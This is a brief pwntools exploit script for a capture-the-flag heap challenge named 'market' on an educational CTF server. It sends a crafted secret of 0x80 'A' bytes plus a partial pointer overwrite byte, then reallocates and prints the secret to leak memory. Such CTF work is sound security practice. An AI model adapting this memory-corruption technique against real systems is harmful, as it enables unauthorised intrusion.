from pwn import *

context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "debug"

# r = process("./market")
r = remote("edu-ctf.zoolab.org", 30209)

r.sendlineafter(b"Do you need the admin ?\n> ", b"n")

# Get PerthreadBlock
r.sendlineafter(b"What's your name ?\n> ", b"apple")
r.sendlineafter(b"How long is your secret ?\n> ", str(0x280))
r.sendafter(b"What's your secret ?\n> ", b'A'*0x80+b"\xb0")

# Get
r.sendlineafter(b"new secret", b"4")
r.sendlineafter(b"How long is your secret ?\n> ", str(0x10))
# gdb.attach(r)
r.sendafter(b"What's your secret ?\n> ", b"a"*0x10)

# Print Out Secret

r.sendlineafter(b"new secret", b"2")
r.interactive()